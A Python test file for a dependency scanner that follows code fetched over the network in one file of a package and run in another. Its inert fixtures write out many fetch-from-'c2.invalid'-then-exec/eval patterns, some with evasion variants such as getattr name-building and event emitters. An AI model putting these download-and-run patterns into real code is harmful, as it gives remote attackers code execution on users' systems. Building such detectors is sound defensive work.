"""The cross-file follower (_cross_file_received_issues), 0.1.8: the forms a
received value takes from one file of a package to another (items 8 and 9
of the backlog: several hops, class methods called directly, a class
through a namespace, static methods, re-exports, wrappers), environment
variables as the channel between files (item 7), and the evasions and
crafted false positives of the adversarial pass (item 11); since 0.1.8 an
event emitter between files (a value received and emitted in one file,
run by a listener in another).

Each case is a small package of inert text: hosts are .invalid, nothing
is executed. `want` is the sorted (file, category) the follower reports;
[] where it must report nothing.
"""
import unittest

from lazaret.scanner import core

U = "'https://c2.invalid/p'"
PY_NET = "import requests\n\ndef pull():\n    return requests.get(" + U + ").text\n"
JS_NET = "const https = require('https');\n\nfunction pull() {\n  return fetch(" + U + ").then((r) => r.text());\n}\n"
EMIT_NET = ("const EventEmitter = require('events');\nconst bus = new EventEmitter();\n"
            "fetch(" + U + ").then((r) => r.text()).then((c) => bus.emit('code', c));\nmodule.exports = { bus };\n")


def py(files):
    return [{"path": "site-packages/" + p, "lang": "py", "dep": True, "content": c} for p, c in files.items()]


def js(files):
    return [{"path": "node_modules/pkg/" + p, "lang": "js", "dep": True, "content": c} for p, c in files.items()]


def found(files):
    return sorted((i["file"].split("/", 1)[1] if i["file"].startswith("site-packages/")
                   else i["file"][len("node_modules/pkg/"):], i["msg"].split(";")[0])
                  for i in core._cross_file_received_issues(files))


RUN = "Dependency code runs code it receives over the network"
IMPORT = "Dependency code loads a module named by data it receives over the network"

# ---- Python packages ------------------------------------------------------
PY_CASES = [
    ("a function imported by name", {"pkg/_net.py": PY_NET, "pkg/__init__.py": "from ._net import pull\nexec(pull())\n"},
     [("pkg/__init__.py", RUN)]),
    ("renamed", {"pkg/_net.py": PY_NET, "pkg/run.py": "from ._net import pull as p\nexec(p())\n"},
     [("pkg/run.py", RUN)]),
    ("imported over several rows", {"pkg/_net.py": PY_NET, "pkg/run.py": "from ._net import (\n    pull,\n)\nexec(pull())\n"},
     [("pkg/run.py", RUN)]),
    ("a module-level value", {"pkg/_net.py": "import requests\nDATA = requests.get(" + U + ").text\n",
                              "pkg/run.py": "from ._net import DATA\nexec(DATA)\n"}, [("pkg/run.py", RUN)]),
    ("the module imported relatively", {"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nexec(_net.pull())\n"},
     [("pkg/run.py", RUN)]),
    ("the module imported absolutely", {"pkg/_net.py": PY_NET, "pkg/run.py": "from pkg import _net\nexec(_net.pull())\n"},
     [("pkg/run.py", RUN)]),
    ("import … as", {"pkg/_net.py": PY_NET, "pkg/run.py": "import pkg._net as n\nexec(n.pull())\n"},
     [("pkg/run.py", RUN)]),
    ("a dotted import", {"pkg/_net.py": PY_NET, "pkg/run.py": "import pkg._net\nexec(pkg._net.pull())\n"},
     [("pkg/run.py", RUN)]),
    ("an instance's method", {"pkg/client.py": "import requests\nclass Client:\n    def pull(self):\n"
                                               "        return requests.get(" + U + ").text\n",
                              "pkg/run.py": "from .client import Client\nc = Client()\nexec(c.pull())\n"},
     [("pkg/run.py", RUN)]),
    ("a method called on a new instance", {"pkg/client.py": "import requests\nclass Client:\n    def pull(self):\n"
                                                            "        return requests.get(" + U + ").text\n",
                                           "pkg/run.py": "from .client import Client\nexec(Client().pull())\n"},
     [("pkg/run.py", RUN)]),
    ("a class through its module", {"pkg/client.py": "import requests\nclass Client:\n    def pull(self):\n"
                                                     "        return requests.get(" + U + ").text\n",
                                    "pkg/run.py": "from . import client\nc = client.Client()\nexec(c.pull())\n"},
     [("pkg/run.py", RUN)]),
    ("a static method", {"pkg/client.py": "import requests\nclass Client:\n    @staticmethod\n    def pull():\n"
                                          "        return requests.get(" + U + ").text\n",
                         "pkg/run.py": "from .client import Client\nexec(Client.pull())\n"}, [("pkg/run.py", RUN)]),
    ("re-exported by the package", {"pkg/_net.py": PY_NET, "pkg/__init__.py": "from ._net import pull\n",
                                    "pkg/run.py": "from pkg import pull\nexec(pull())\n"}, [("pkg/run.py", RUN)]),
    ("through a wrapper", {"pkg/_net.py": PY_NET, "pkg/api.py": "from ._net import pull\n\ndef load():\n    return pull()\n",
                           "pkg/run.py": "from .api import load\nexec(load())\n"}, [("pkg/run.py", RUN)]),
    ("three files deep", {"pkg/_net.py": PY_NET, "pkg/a.py": "from ._net import pull\n\ndef one():\n    return pull()\n",
                          "pkg/b.py": "from .a import one\n\ndef two():\n    return one()\n",
                          "pkg/run.py": "from .b import two\nexec(two())\n"}, [("pkg/run.py", RUN)]),
    ("a module name it imports", {"pkg/_net.py": PY_NET, "pkg/run.py": "import importlib\nfrom ._net import pull\n"
                                                                        "importlib.import_module(pull())\n"},
     [("pkg/run.py", IMPORT)]),
    ("an environment variable between files",
     {"pkg/_net.py": "import os, requests\nos.environ['PAYLOAD'] = requests.get(" + U + ").text\n",
      "pkg/run.py": "import os\nexec(os.getenv('PAYLOAD'))\n"}, [("pkg/run.py", RUN)]),
]
PY_QUIET = [
    ("parsed, not run", {"pkg/_net.py": PY_NET, "pkg/run.py": "import json\nfrom ._net import pull\njson.loads(pull())\n"}),
    ("a function of the same name in another module",
     {"pkg/_net.py": PY_NET, "pkg/other.py": "def pull():\n    return 'print(1)'\n",
      "pkg/run.py": "from .other import pull\nexec(pull())\n"}),
    ("an example in a docstring", {"pkg/_net.py": PY_NET,
                                   "pkg/run.py": "from ._net import pull\n\ndef use():\n    \"\"\"Example:\n\n"
                                                 "        exec(pull())\n    \"\"\"\n    return pull()\n"}),
    ("a comment", {"pkg/_net.py": PY_NET, "pkg/run.py": "from ._net import pull\n# exec(pull()) would be unsafe\n"
                                                         "data = pull()\n"}),
    ("an environment variable the package never set",
     {"pkg/_net.py": PY_NET, "pkg/run.py": "import os\nexec(os.getenv('PAYLOAD'))\n"}),
    ("a variable set from a local value",
     {"pkg/_net.py": "import os\nos.environ['PAYLOAD'] = 'print(1)'\nimport requests\nrequests.get(" + U + ")\n",
      "pkg/run.py": "import os\nexec(os.getenv('PAYLOAD'))\n"}),
]

# ---- npm packages -----------------------------------------------------------
JS_CASES = [
    ("a named export", {"net.js": JS_NET + "module.exports = { pull };\n",
                        "run.js": "const { pull } = require('./net');\npull().then((c) => eval(c));\n"}, [("run.js", RUN)]),
    ("exports.name =", {"net.js": JS_NET + "exports.pull = pull;\n",
                        "run.js": "const net = require('./net');\nnet.pull().then((c) => eval(c));\n"}, [("run.js", RUN)]),
    ("an ES module", {"net.mjs": "export async function pull() {\n  return (await fetch(" + U + ")).text();\n}\n",
                      "run.mjs": "import { pull } from './net.mjs';\neval(await pull());\n"}, [("run.mjs", RUN)]),
    ("a default export function", {"net.mjs": "export default async function pull() {\n  return (await fetch(" + U + ")).text();\n}\n",
                                   "run.mjs": "import pull from './net.mjs';\neval(await pull());\n"}, [("run.mjs", RUN)]),
    ("module.exports = function", {"net.js": "module.exports = function () {\n  return fetch(" + U + ").then((r) => r.text());\n};\n",
                                   "run.js": "const pull = require('./net');\npull().then((c) => eval(c));\n"}, [("run.js", RUN)]),
    ("TypeScript's CommonJS output", {"net.js": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\n"
                                                "exports.pull = void 0;\nasync function pull() {\n"
                                                "    return (await fetch(" + U + ")).text();\n}\nexports.pull = pull;\n",
                                      "run.js": "\"use strict\";\nconst net_1 = require(\"./net\");\n(async () => {\n"
                                                "    eval(await (0, net_1.pull)());\n})();\n"}, [("run.js", RUN)]),
    ("a method on a new instance", {"client.js": "class Client {\n  async pull() {\n    return (await fetch(" + U + ")).text();\n  }\n}\n"
                                                 "module.exports = { Client };\n",
                                    "run.js": "const { Client } = require('./client');\n(async () => {\n"
                                              "  eval(await new Client().pull());\n})();\n"}, [("run.js", RUN)]),
    ("a class through a namespace", {"client.js": "class Client {\n  async pull() {\n    return (await fetch(" + U + ")).text();\n  }\n}\n"
                                                  "module.exports = { Client };\n",
                                     "run.js": "const lib = require('./client');\n(async () => {\n  const c = new lib.Client();\n"
                                               "  eval(await c.pull());\n})();\n"}, [("run.js", RUN)]),
    ("a static method", {"client.js": "class Client {\n  static async pull() {\n    return (await fetch(" + U + ")).text();\n  }\n}\n"
                                      "module.exports = { Client };\n",
                         "run.js": "const { Client } = require('./client');\n(async () => {\n  eval(await Client.pull());\n})();\n"},
     [("run.js", RUN)]),
    ("re-exported by an index", {"net.js": JS_NET + "module.exports = { pull };\n",
                                 "index.js": "module.exports = require('./net');\n",
                                 "run.js": "const { pull } = require('./index');\npull().then((c) => eval(c));\n"},
     [("run.js", RUN)]),
    ("export … from", {"net.mjs": "export async function pull() {\n  return (await fetch(" + U + ")).text();\n}\n",
                       "index.mjs": "export { pull } from './net.mjs';\n",
                       "run.mjs": "import { pull } from './index.mjs';\neval(await pull());\n"}, [("run.mjs", RUN)]),
    ("through a wrapper", {"net.js": JS_NET + "module.exports = { pull };\n",
                           "api.js": "const { pull } = require('./net');\nfunction fetchIt() {\n  return pull();\n}\n"
                                     "module.exports = { fetchIt };\n",
                           "run.js": "const { fetchIt } = require('./api');\nfetchIt().then((c) => eval(c));\n"},
     [("run.js", RUN)]),
    ("an environment variable between files",
     {"net.js": "(async () => {\n  process.env.PAYLOAD = await (await fetch(" + U + ")).text();\n})();\n",
      "run.js": "setTimeout(() => eval(process.env.PAYLOAD), 1000);\n"}, [("run.js", RUN)]),
]
JS_QUIET = [
    ("parsed, not run", {"net.js": JS_NET + "module.exports = { pull };\n",
                         "run.js": "const { pull } = require('./net');\npull().then((c) => JSON.parse(c));\n"}),
    ("a RegExp's exec", {"net.js": JS_NET + "module.exports = { pull };\n",
                         "run.js": "const { pull } = require('./net');\npull().then((c) => /x/.exec(c));\n"}),
    ("a comment", {"net.js": JS_NET + "module.exports = { pull };\n",
                   "run.js": "const { pull } = require('./net');\n// pull().then((c) => eval(c)) would be unsafe\n"
                             "pull().then((c) => console.log(c));\n"}),
    ("an environment variable the package never set",
     {"net.js": JS_NET + "module.exports = { pull };\n", "run.js": "eval(process.env.PAYLOAD);\n"}),
]


# ---- the adversarial pass (item 11) ----------------------------------------
# Evasions: ways to carry the value between files, or to run it, that the
# first follower did not read. Each is read now; `want` is (file, message up
# to the name of the other file).
RECEIVED = RUN + "; the value is received in another file of the package"
RUN_THERE = RUN + "; the function that runs it is in another file of the package"
JS_NET_EXP = JS_NET + "module.exports = { pull };\n"
CLIENT_PY = "import requests\nclass Client:\n    def pull(self):\n        return requests.get(" + U + ").text\n"
CLIENT_JS = "class Client {\n  async pull() {\n    return (await fetch(" + U + ")).text();\n  }\n}\nmodule.exports = { Client };\n"
ADVERSARIAL = [
    ("getattr on the module", py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nexec(getattr(_net, 'pull')())\n"}),
     [("pkg/run.py", RECEIVED)]),
    ("importlib.import_module by name", py({"pkg/_net.py": PY_NET, "pkg/run.py": "import importlib\n"
                                             "n = importlib.import_module('pkg._net')\nexec(n.pull())\n"}),
     [("pkg/run.py", RECEIVED)]),
    ("__import__ of a submodule", py({"pkg/_net.py": PY_NET, "pkg/run.py": "n = __import__('pkg._net')\nexec(n._net.pull())\n"}),
     [("pkg/run.py", RECEIVED)]),
    ("a class attribute", py({"pkg/_net.py": "import requests\nclass C:\n    data = requests.get(" + U + ").text\n",
                              "pkg/run.py": "from ._net import C\nexec(C.data)\n"}), [("pkg/run.py", RECEIVED)]),
    ("a module-level cache filled by a function", py({"pkg/_net.py": "import requests\nCACHE = {}\ndef load():\n"
                                                                     "    CACHE['c'] = requests.get(" + U + ").text\n",
                                                      "pkg/run.py": "from ._net import CACHE, load\nload()\nexec(CACHE['c'])\n"}),
     [("pkg/run.py", RECEIVED)]),
    ("an instance kept on self", py({"pkg/client.py": CLIENT_PY,
                                     "pkg/run.py": "from .client import Client\nclass R:\n    def __init__(self):\n"
                                                   "        self.c = Client()\n    def go(self):\n        exec(self.c.pull())\n"}),
     [("pkg/run.py", RECEIVED)]),
    ("a callback", py({"pkg/_net.py": "import requests\ndef pull(cb):\n    cb(requests.get(" + U + ").text)\n",
                       "pkg/run.py": "from ._net import pull\npull(lambda c: exec(c))\n"}), [("pkg/run.py", RECEIVED)]),
    ("a classmethod", py({"pkg/c.py": "import requests\nclass C:\n    @classmethod\n    def pull(cls):\n"
                                      "        return requests.get(" + U + ").text\n",
                          "pkg/run.py": "from .c import C\nexec(C.pull())\n"}), [("pkg/run.py", RECEIVED)]),
    ("the runner in another file", py({"pkg/util.py": "def run(code):\n    exec(code)\n",
                                       "pkg/__init__.py": "import requests\nfrom .util import run\nrun(requests.get(" + U + ").text)\n"}),
     [("pkg/__init__.py", RUN_THERE)]),
    ("https.get delivered to a callback", js({"net.js": "const https = require('https');\nfunction pull(cb) {\n"
                                                        "  https.get(" + U + ", (res) => { let d = ''; res.on('data', (c) => d += c); "
                                                        "res.on('end', () => cb(d)); });\n}\nmodule.exports = { pull };\n",
                                              "run.js": "const { pull } = require('./net');\npull((code) => eval(code));\n"}),
     [("run.js", RECEIVED)]),
    ("a Promise's resolve", js({"net.js": "const https = require('https');\nfunction pull() {\n  return new Promise((resolve) => {\n"
                                          "    https.get(" + U + ", (res) => { let d = ''; res.on('data', (c) => d += c); "
                                          "res.on('end', () => resolve(d)); });\n  });\n}\nmodule.exports = { pull };\n",
                                "run.js": "const { pull } = require('./net');\npull().then((code) => eval(code));\n"}),
     [("run.js", RECEIVED)]),
    ("require(path.join(__dirname, …))", js({"net.js": JS_NET_EXP, "run.js": "const path = require('path');\n"
                                             "const { pull } = require(path.join(__dirname, 'net'));\npull().then((c) => eval(c));\n"}),
     [("run.js", RECEIVED)]),
    ("require(__dirname + …)", js({"net.js": JS_NET_EXP, "run.js": "const { pull } = require(__dirname + '/net');\n"
                                                                   "pull().then((c) => eval(c));\n"}), [("run.js", RECEIVED)]),
    ("quoted keys", js({"net.js": JS_NET + "module.exports = { 'pull': pull };\n",
                        "run.js": "const { pull } = require('./net');\npull().then((c) => eval(c));\n"}), [("run.js", RECEIVED)]),
    ("exports['name']", js({"net.js": JS_NET + "exports['pull'] = pull;\n",
                            "run.js": "const net = require('./net');\nnet.pull().then((c) => eval(c));\n"}), [("run.js", RECEIVED)]),
    ("require('..')", js({"index.js": JS_NET_EXP, "lib/run.js": "const { pull } = require('..');\npull().then((c) => eval(c));\n"}),
     [("lib/run.js", RECEIVED)]),
    ("an instance kept on this", js({"client.js": CLIENT_JS,
                                     "run.js": "const { Client } = require('./client');\nclass R {\n"
                                               "  constructor() { this.c = new Client(); }\n  async go() { eval(await this.c.pull()); }\n}\n"
                                               "new R().go();\n"}), [("run.js", RECEIVED)]),
    ("an object filled later", js({"net.js": "const cache = {};\nasync function load() {\n"
                                             "  cache.code = await (await fetch(" + U + ")).text();\n}\nmodule.exports = { cache, load };\n",
                                   "run.js": "const { cache, load } = require('./net');\nload().then(() => eval(cache.code));\n"}),
     [("run.js", RECEIVED)]),
    ("a dynamic import()", js({"net.mjs": "export async function pull() {\n  return (await fetch(" + U + ")).text();\n}\n",
                               "run.mjs": "const { pull } = await import('./net.mjs');\neval(await pull());\n"}), [("run.mjs", RECEIVED)]),
    ("export default { … }", js({"net.mjs": "async function pull() {\n  return (await fetch(" + U + ")).text();\n}\n"
                                            "export default { pull };\n",
                                 "run.mjs": "import net from './net.mjs';\neval(await net.pull());\n"}), [("run.mjs", RECEIVED)]),
    ("module.exports = { method() {…} }", js({"api.js": "module.exports = {\n  async getConfig() {\n"
                                                        "    const r = await fetch(" + U + ");\n    return r.text();\n  },\n"
                                                        "  version: '1.0',\n};\n",
                                              "index.js": "const api = require('./api');\napi.getConfig().then((c) => eval(c));\n"}),
     [("index.js", RECEIVED)]),
    ("an object's arrow members", js({"api.js": "const api = {\n  getConfig: async () => (await fetch(" + U + ")).text(),\n};\n"
                                                "module.exports = api;\n",
                                      "index.js": "const { getConfig } = require('./api');\ngetConfig().then((c) => new Function(c)());\n"}),
     [("index.js", RECEIVED)]),
    ("TypeScript's __importDefault and exports.default",
     js({"net.js": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nasync function pull() {\n"
                   "    return (await fetch(" + U + ")).text();\n}\nexports.default = pull;\n",
         "run.js": "\"use strict\";\nconst net_1 = __importDefault(require(\"./net\"));\n"
                   "(async () => { eval(await (0, net_1.default)()); })();\n"}), [("run.js", RECEIVED)]),
    ("a class field holding an arrow", js({"client.js": "class Client {\n  pull = async () => {\n"
                                                        "    return (await fetch(" + U + ")).text();\n  };\n}\n"
                                                        "module.exports = { Client };\n",
                                           "run.js": "const { Client } = require('./client');\nconst c = new Client();\n"
                                                     "c.pull().then((x) => eval(x));\n"}), [("run.js", RECEIVED)]),
    ("module.exports = class", js({"client.js": "module.exports = class Client {\n  async pull() {\n"
                                                "    return (await fetch(" + U + ")).text();\n  }\n};\n",
                                   "run.js": "const Client = require('./client');\nconst c = new Client();\n"
                                             "c.pull().then((x) => eval(x));\n"}), [("run.js", RECEIVED)]),
    ("the runner handed to then()", js({"net.js": JS_NET_EXP, "run.js": "const { pull } = require('./net');\npull().then(eval);\n"}),
     [("run.js", RECEIVED)]),
    ("the runner in another file", js({"util.js": "exports.execute = (code) => eval(code);\n",
                                       "index.js": "const { execute } = require('./util');\n"
                                                   "fetch(" + U + ").then((r) => r.text()).then((c) => execute(c));\n"}),
     [("index.js", RUN_THERE)]),
    ("another file's runner handed to then()", js({"util.js": "function execute(code) {\n  return eval(code);\n}\n"
                                                              "module.exports = { execute };\n",
                                                   "index.js": "const util = require('./util');\n"
                                                               "fetch(" + U + ").then((r) => r.text()).then(util.execute);\n"}),
     [("index.js", RUN_THERE)]),
    # an event emitter between files (0.1.8): emitted where it is received, run by a listener
    ("an event emitter", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n"}),
     [("run.js", RECEIVED)]),
    ("a listener given by name", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\nbus.on('code', eval);\n"}),
     [("run.js", RECEIVED)]),
    ("a once listener that is a function", js({"net.js": EMIT_NET,
                                               "run.js": "const { bus } = require('./net');\n"
                                                         "bus.once('code', function (src) {\n  new Function(src)();\n});\n"}),
     [("run.js", RECEIVED)]),
    ("process as the emitter", js({"net.js": "fetch(" + U + ").then((r) => r.text()).then((b) => process.emit('boot', b));\n",
                                   "run.js": "process.on('boot', (x) => { require('vm').runInThisContext(x); });\n"}),
     [("run.js", RECEIVED)]),
    ("an emitter a third module exports", js({"ev.js": "const E = require('events');\nmodule.exports = new E();\n",
                                              "net.js": "const bus = require('./ev');\n"
                                                        "fetch(" + U + ").then((r) => r.text()).then((c) => bus.emit('code', c));\n",
                                              "run.js": "const bus = require('./ev');\nbus.on('code', (c) => eval(c));\n"}),
     [("run.js", RECEIVED)]),
    ("a listener after a comment with astral characters",
     js({"net.js": "/* \U0001d41a\U0001f600 */ " + EMIT_NET,
         "run.js": "const { bus } = require('./net'); /* \U0001f600 */ bus.on('code', (c) => eval(c));\n"}),
     [("run.js", RECEIVED)]),
]
# The detection round: a runner behind another function (one that hands its
# parameter on), more than four hops, and a getattr whose name the file
# builds of what it holds.
def _hops(n):
    files, prev = {"pkg/_net.py": PY_NET}, ("._net", "pull")
    for i in range(n):
        files[f"pkg/h{i}.py"] = f"from {prev[0]} import {prev[1]}\n\ndef f{i}():\n    return {prev[1]}()\n"
        prev = (f".h{i}", f"f{i}")
    files["pkg/run.py"] = f"from {prev[0]} import {prev[1]}\nexec({prev[1]}())\n"
    return py(files)


RUNNER_PY = "def run(code):\n    exec(code)\n"
GO_PY = "import requests\nfrom .mid import go\ngo(requests.get(" + U + ").text)\n"
ADVERSARIAL += [
    ("a runner behind another function", py({"pkg/util.py": RUNNER_PY, "pkg/mid.py": "from .util import run\n\ndef go(c):\n    run(c)\n",
                                             "pkg/__init__.py": GO_PY}), [("pkg/__init__.py", RUN_THERE)]),
    ("a runner behind a function of its own file",
     py({"pkg/mid.py": RUNNER_PY + "\ndef go(c):\n    return run(c)\n", "pkg/__init__.py": GO_PY}), [("pkg/__init__.py", RUN_THERE)]),
    ("a runner two functions deep", py({"pkg/util.py": RUNNER_PY, "pkg/one.py": "from .util import run\n\ndef hand(c):\n    run(c)\n",
                                        "pkg/mid.py": "from . import one\n\ndef go(c):\n    one.hand(c)\n", "pkg/__init__.py": GO_PY}),
     [("pkg/__init__.py", RUN_THERE)]),
    ("a JavaScript runner behind another function",
     js({"util.js": "exports.execute = (code) => eval(code);\n",
         "mid.js": "const { execute } = require('./util');\nfunction go(c) {\n  return execute(c);\n}\nmodule.exports = { go };\n",
         "index.js": "const { go } = require('./mid');\nfetch(" + U + ").then((r) => r.text()).then((c) => go(c));\n"}),
     [("index.js", RUN_THERE)]),
    ("six files deep", _hops(6), [("pkg/run.py", RECEIVED)]),
    ("getattr with a name held in a constant",
     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nNAME = 'pull'\nexec(getattr(_net, NAME)())\n"}),
     [("pkg/run.py", RECEIVED)]),
    ("getattr with a name in pieces",
     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nexec(getattr(_net, 'pu' + \"ll\", None)())\n"}),
     [("pkg/run.py", RECEIVED)]),
    ("getattr with a constant and a piece",
     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nHEAD = 'p' + 'u'\nexec(getattr(_net, HEAD + 'll')())\n"}),
     [("pkg/run.py", RECEIVED)]),
]
# Crafted false positives: each looks like a flow and is not one.
ADVERSARIAL_QUIET = [
    ("an emitted constant", js({"net.js": "const E = require('events');\nconst bus = new E();\nfetch(" + U + ");\n"
                                          "bus.emit('code', 'console.log(1)');\nmodule.exports = { bus };\n",
                                "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n"})),
    ("a listener that logs", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\n"
                                                               "bus.on('code', (c) => console.log(c));\n"})),
    ("another event", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\nbus.on('data', (c) => eval(c));\n"})),
    ("an emitter and a listener in one file", js({"net.js": EMIT_NET + "bus.on('code', (c) => eval(c));\n",
                                                  "other.js": "module.exports = 1;\n"})),
    ("two classes' own emitters", js({"net.js": "const E = require('events');\nclass A extends E {\n"
                                                "  load() { fetch(" + U + ").then((r) => r.text()).then((c) => "
                                                "this.emit('code', c)); }\n}\nmodule.exports = { A };\n",
                                      "run.js": "const E = require('events');\nclass B extends E {\n"
                                                "  constructor() { super(); this.on('code', (c) => eval(c)); }\n}\n"
                                                "module.exports = { B };\n"})),
    ("an emitter each function is given", js({"net.js": "module.exports = (ee) => fetch(" + U + ")"
                                                         ".then((r) => r.text()).then((c) => ee.emit('code', c));\n",
                                               "run.js": "module.exports = (ee) => ee.on('code', (c) => eval(c));\n"})),
    # a file that runs what it receives itself is the single-file test's; its emit is only a comment
    ("an emit in a comment", js({"net.js": "const E = require('events');\nconst bus = new E();\n"
                                           "fetch(" + U + ").then((r) => r.text()).then((c) => eval(c));\n"
                                           "// then: bus.emit('code', c);\nmodule.exports = { bus };\n",
                                 "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n"})),
    ("a listener in a comment", js({"net.js": EMIT_NET, "run.js": "const { bus } = require('./net');\n"
                                                                 "/* bus.on('code', eval); */\n"})),
    ("a runner fed only local strings", js({"util.js": "exports.execute = (code) => eval(code);\n",
                                            "index.js": "const { execute } = require('./util');\nconst https = require('https');\n"
                                                        "execute('1 + 1');\nhttps.get(" + U + ", (r) => r.resume());\n"})),
    ("a callback helper whose data is parsed", js({"http.js": "const https = require('https');\nfunction get(url, cb) {\n"
                                                              "  https.get(url, (res) => { let d = ''; res.on('data', (c) => d += c); "
                                                              "res.on('end', () => cb(null, d)); });\n}\nmodule.exports = { get };\n",
                                                   "run.js": "const { get } = require('./http');\n"
                                                             "get(" + U + ", (err, body) => console.log(JSON.parse(body)));\n"})),
    ("a cache filled with a constant", js({"net.js": "const cache = {};\nfunction load() {\n  cache.code = 'console.log(1)';\n"
                                                     "  return fetch(" + U + ");\n}\nmodule.exports = { cache, load };\n",
                                           "run.js": "const { cache, load } = require('./net');\nload().then(() => eval(cache.code));\n"})),
    ("a class attribute that is a URL", py({"pkg/c.py": "import requests\nclass C:\n    URL = 'https://api.invalid/'\n"
                                                        "    def get(self):\n        return requests.get(self.URL).json()\n",
                                            "pkg/run.py": "from .c import C\nexec(C.URL)\n"})),
    ("import_module in a docstring", py({"pkg/_net.py": PY_NET,
                                         "pkg/run.py": "\"\"\"Usage:\n\n    n = importlib.import_module('pkg._net')\n"
                                                       "    exec(n.pull())\n\"\"\"\nimport os\n"})),
    ("an unrelated instance's attribute", js({"a.js": "class A {\n  async load() { this.data = await (await fetch(" + U + ")).text(); }\n}\n"
                                                      "module.exports = { A };\n",
                                              "b.js": "class B {\n  constructor() { this.data = 'x'; }\n}\nconst b = new B();\n"
                                                      "const https = require('https');\neval(b.data);\n"})),
    ("a shell runner given a constant", py({"pkg/util.py": "import subprocess\ndef run(cmd):\n    subprocess.run(cmd, shell=True)\n",
                                            "pkg/build.py": "import requests\nfrom .util import run\n"
                                                            "v = requests.get(" + U + ").json()\nrun('make all')\n"})),
    ("getattr's value parsed", py({"pkg/_net.py": PY_NET, "pkg/run.py": "import json\nfrom . import _net\n"
                                                                        "x = getattr(_net, 'pull')()\njson.loads(x)\n"})),
]
ADVERSARIAL_QUIET += [
    ("a function that does not hand its parameter on",
     py({"pkg/util.py": RUNNER_PY, "pkg/mid.py": "from .util import run\n\ndef go(c):\n    run('print(1)')\n    return len(c)\n",
         "pkg/__init__.py": GO_PY})),
    ("getattr with a name given twice",
     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nNAME = 'pull'\nNAME = input()\nexec(getattr(_net, NAME)())\n"})),
    ("getattr with a parameter's name",
     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\ndef f(name):\n    exec(getattr(_net, name)())\n"})),
    ("getattr with a name that is no name",
     py({"pkg/_net.py": PY_NET, "pkg/run.py": "from . import _net\nexec(getattr(_net, 'pu' + '-ll')())\n"})),
]
# Known misses, kept here so a change that reads them is noticed (see docs/DESIGN.md §12):
# two top-level modules of site-packages no RECORD lists together (in a
# --deps scan they may be two distributions; a registry scan reads them as
# one; the detection round reads a distribution's: _xf_site_groups).
KNOWN_MISSES = [
    ("two top-level modules", py({"a.py": PY_NET, "b.py": "from a import pull\nexec(pull())\n"})),
]


def found_full(files, **kw):
    """(package-relative file, message without the other file's name) the follower reports."""
    return sorted((i["file"].split("/", 1)[1] if i["file"].startswith("site-packages/")
                   else i["file"][len("node_modules/pkg/"):], i["msg"].rsplit(" (", 1)[0])
                  for i in core._cross_file_received_issues(files, **kw))


class CrossFileFollowerTests(unittest.TestCase):
    maxDiff = None

    def test_python_forms(self):
        for label, files, want in PY_CASES:
            with self.subTest(label):
                self.assertEqual(found(py(files)), sorted(want))

    def test_python_quiet(self):
        for label, files in PY_QUIET:
            with self.subTest(label):
                self.assertEqual(found(py(files)), [])

    def test_javascript_forms(self):
        for label, files, want in JS_CASES:
            with self.subTest(label):
                self.assertEqual(found(js(files)), sorted(want))

    def test_javascript_quiet(self):
        for label, files in JS_QUIET:
            with self.subTest(label):
                self.assertEqual(found(js(files)), [])

    def test_the_adversarial_forms(self):
        for label, files, want in ADVERSARIAL:
            with self.subTest(label):
                self.assertEqual(found_full(files), sorted(want))

    def test_the_crafted_false_positives(self):
        for label, files in ADVERSARIAL_QUIET + KNOWN_MISSES:
            with self.subTest(label):
                self.assertEqual(found_full(files), [])

    def test_a_registry_scan_reads_one_distribution(self):
        """one_package: a distribution's top-level modules import each other."""
        files = py({"a.py": PY_NET, "b.py": "from a import pull\nexec(pull())\n"})
        self.assertEqual(found_full(files, one_package=True), [("b.py", RECEIVED)])
        got = core._cross_file_received_issues(files, one_package=True, who=lambda p: p.split("/")[-1])
        self.assertTrue(got[0]["msg"].startswith("b.py runs code it receives over the network;"), got)

    def test_a_distributions_top_level_modules(self):
        """site_groups (the detection round): the modules one distribution's
        RECORD lists are one package in a --deps scan."""
        files = py({"a.py": PY_NET, "b.py": "from a import pull\nexec(pull())\n", "c.py": "x = 1\n"})
        groups = {"site-packages/a.py": "site-packages/x-1.0.dist-info", "site-packages/b.py": "site-packages/x-1.0.dist-info"}
        self.assertEqual(found_full(files, site_groups=groups), [("b.py", RECEIVED)])
        self.assertEqual(found_full(files), [])

    def test_a_file_that_shows_it_alone_is_left_to_the_single_file_test(self):
        files = py({"pkg/_net.py": PY_NET, "pkg/run.py": "import requests\nfrom ._net import pull\n"
                                                         "exec(requests.get(" + U + ").text)\n"})
        self.assertEqual(found_full(files), [])
        self.assertIsNotNone(core.runs_received_code(files[1]["content"]))

    def test_skip_paths(self):
        files = py({"pkg/_net.py": PY_NET, "pkg/__init__.py": "from ._net import pull\nexec(pull())\n"})
        self.assertEqual(found_full(files, skip_paths={"site-packages/pkg/__init__.py"}), [])


class SiteGroupTests(unittest.TestCase):
    """_xf_site_groups: the top-level modules and packages a distribution's
    .dist-info/RECORD lists together, read from the disk of a --deps scan."""

    def setUp(self):
        import tempfile
        self.tmp = tempfile.TemporaryDirectory()
        self.root = self.tmp.name
        self.site = "venv/lib/python3.12/site-packages"

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, rel, text):
        import os
        path = os.path.join(self.root, *(self.site + "/" + rel).split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(text)

    def files(self, rels):
        return [{"path": self.site + "/" + r, "lang": "py", "dep": True, "content": "x = 1\n"} for r in rels]

    def groups(self, rels):
        return {k[len(self.site) + 1:]: v[len(self.site) + 1:] for k, v in
                core._xf_site_groups(self.root, self.files(rels)).items()}

